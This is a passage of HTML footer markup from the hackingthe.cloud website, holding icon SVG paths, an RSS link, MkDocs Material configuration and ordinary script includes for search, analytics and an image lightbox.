4.6-4.6-.3-1.9-3-3.2-5.9-2.9M244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8M97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1m-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7m32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1m-11.4-14.7c-1.6 1-1.6 3.6 0 5.9s4.3 3.3 5.6 2.3c1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2"/></svg> </a> <a href=https://hackingthe.cloud/feed_rss_created.xml target=_blank rel=noopener title=hackingthe.cloud class=md-social__link> <svg xmlns=http://www.w3.org/2000/svg viewbox="0 0 448 512"><!-- Font Awesome Free 6.7.1 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M0 64c0-17.7 14.3-32 32-32 229.8 0 416 186.2 416 416 0 17.7-14.3 32-32 32s-32-14.3-32-32C384 253.6 226.4 96 32 96 14.3 96 0 81.7 0 64m0 352a64 64 0 1 1 128 0 64 64 0 1 1-128 0m32-256c159.1 0 288 128.9 288 288 0 17.7-14.3 32-32 32s-32-14.3-32-32c0-123.7-100.3-224-224-224-17.7 0-32-14.3-32-32s14.3-32 32-32"/></svg> </a> </div> </div> </div> </footer> </div> <div class=md-dialog data-md-component=dialog> <div class="md-dialog__inner md-typeset"></div> </div> <script id=__config type=application/json>{"base": "../../../..", "features": ["navigation.tabs", "navigation.indexes", "content.action.edit"], "search": "../../../../assets/javascripts/workers/search.c7c1ca2c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script> <script src=../../../../assets/javascripts/bundle.b71cdcd1.min.js></script> <script src=../../../../javascripts/matomo.min.js></script> <script id="init-glightbox">const lightbox = GLightbox({"touchNavigation": true, "loop": false, "zoomable": true, "draggable": true, "openEffect": "zoom", "closeEffect": "zoom", "slideEffect": "slide"});
document$.subscribe(() => { lightbox.reload() });
</script></body> </html>